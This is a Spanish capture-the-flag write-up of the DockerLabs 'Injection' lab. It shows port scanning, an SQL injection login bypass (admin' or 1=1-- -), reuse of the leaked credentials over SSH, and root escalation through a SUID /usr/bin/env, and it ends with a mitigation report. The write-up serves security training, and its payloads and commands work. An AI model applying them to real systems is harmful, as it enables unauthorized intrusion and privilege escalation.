# Injection

> Bypass de autenticación por SQL injection para filtrar credenciales, acceso por SSH y escalada a root abusando del bit SUID en /usr/bin/env.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 2 |

**Tags:** `SQLi` · `Bypass de login` · `SSH` · `SUID` · `GTFOBins`

---

## Reconocimiento

```bash
$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Dos puertos abiertos: SSH (22) y un servidor web (80). La web es el punto de entrada más prometedor.

## Bypass de login con SQL Injection

Al abrir `http://172.17.0.2` aparece un panel de login: el candidato perfecto para una inyección SQL que eluda la autenticación.

> **Nota.** En el campo usuario meto `admin' or 1=1-- -` y en contraseña cualquier valor. La condición `1=1` hace que la consulta sea siempre verdadera y salta el control de credenciales.

La aplicación no solo me deja pasar: además filtra las credenciales de un usuario real.

```bash
Bienvenido Dylan! Has insertado correctamente tu contraseña:
KJSDFG789FGSDF78
```

Tengo un par de credenciales válidas — **dylan : KJSDFG789FGSDF78** — que probaré contra el SSH.

## Acceso por SSH

```bash
$ ssh dylan@172.17.0.2
dylan@172.17.0.2's password: (KJSDFG789FGSDF78)
Welcome to Ubuntu 22.04.4 LTS
dylan@11574bbb421e:~$
```

## Escalada a root · SUID

```bash
$ find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/env   <-- binario abusable
```

`/usr/bin/env` aparece en la lista. Según GTFOBins, con el bit SUID puedo usarlo para lanzar un shell que herede los privilegios del propietario. El flag `-p` evita que sh descarte el EUID heredado.

```bash
$ /usr/bin/env /bin/sh -p
# whoami
root
```

Máquina Injection completada: `uid=0(root)`.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Escalada a root por bit SUID en /usr/bin/env

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** env tiene el bit SUID de root: cualquier usuario local obtiene una shell root en un solo paso (GTFOBins).

**Mitigación.** Quitar el SUID (chmod u-s /usr/bin/env) y auditar los binarios con SUID; principio de mínimo privilegio.

### 🟠 ALTA — Inyección SQL con bypass de autenticación

`CWE-89` · A03:2021 – Injection

**Impacto.** El login no sanea la entrada: un payload 'or 1=1' salta la autenticación y, además, la aplicación devuelve credenciales válidas de un usuario real.

**Mitigación.** Consultas parametrizadas (prepared statements) o un ORM; nunca construir la consulta concatenando la entrada del usuario.

### 🟡 MEDIA — Reutilización de credenciales (web → SSH)

`CWE-522` · A07:2021 – Identification and Authentication Failures

**Impacto.** La contraseña filtrada por la web sirve tal cual para el acceso por SSH del usuario dylan.

**Mitigación.** Credenciales distintas por servicio, rotación periódica y MFA en accesos remotos.

---

_Writeup de **Injection** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
